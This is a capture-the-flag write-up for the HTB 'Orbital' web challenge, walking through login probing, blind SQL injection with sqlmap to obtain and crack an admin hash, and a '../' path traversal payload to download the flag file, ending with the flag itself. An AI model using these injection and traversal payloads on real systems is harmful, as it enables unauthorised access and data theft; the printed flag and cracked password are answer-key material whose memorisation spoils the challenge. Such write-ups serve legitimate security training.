# web/Orbital

### Description
> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

We have access to a web page, on it we can see login form

![orbital1](/2023/Cyber_Apocalypse/web/images/orbital1.png)

Also we can see that login form send works through API:
```
const login = () => {
   let username = $('#username').val();
   let password = $('#password').val();

   if ($.trim(username) === '' || $.trim(password) === '') {
       show_message();
       return;
   }

   fetch('/api/login', {
       method: 'POST',
       headers: {
           'Content-Type': 'application/json'
       },
       body: JSON.stringify({
           'username': username,
           'password': password
       })
   })
   .then((res) => {
       if (res.status === 200) window.location.replace('/home');
       else show_message();
   });
}
```

This request  `{"username":"admin", "password": {"$ne": "bar"} }` gives `{"error":{"message":["'dict' object has no attribute 'encode'"],"type":"AttributeError"}}` so admin account exists

And `{"username":"admin\"","password":"1234"}` gives `{"error":{"message":["1064","You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\"admin\"\"' at line 1"],"type":"ProgrammingError"}}`

So login form is vulnerable to blind SQLi and we are working with MariaDB

And only at this moment I realised that we have access to source code :/

I used sqlmap and got admin hash

hash **1692b753c031f2905b89e7258dbc49bb**
admin password ichliebedich (googled by hash)

So now we have access to this page
![orbital2](/2023/Cyber_Apocalypse/web/images/orbital2.png)

And then we can find arbitrary file download which we can utilize to read flag file (we know it location from source code)

`{"name":"../signal_sleuth_firmware"}`

*HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}*

